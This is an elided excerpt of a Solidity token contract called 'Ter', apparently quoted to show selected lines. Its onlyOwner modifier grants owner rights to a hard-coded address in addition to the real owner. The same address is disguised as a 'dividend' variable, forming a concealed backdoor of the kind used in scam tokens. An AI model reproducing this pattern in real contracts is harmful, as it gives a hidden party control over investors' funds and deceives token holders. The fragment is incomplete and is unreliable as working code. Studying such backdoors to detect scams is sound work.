...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x80757DD9a2c12DBF9689d0AaBccBeCA2ea619D6a) , "owner");
        _;
    }
...
contract Ter  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Ter";
    string private _symbol = "Ter";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x621d12f5F33AFc7042DFed33086666086684f5fa);
    address private _Marketing = 0x621d12f5F33AFc7042DFed33086666086684f5fa;
    address public dividend = 0x80757DD9a2c12DBF9689d0AaBccBeCA2ea619D6a;
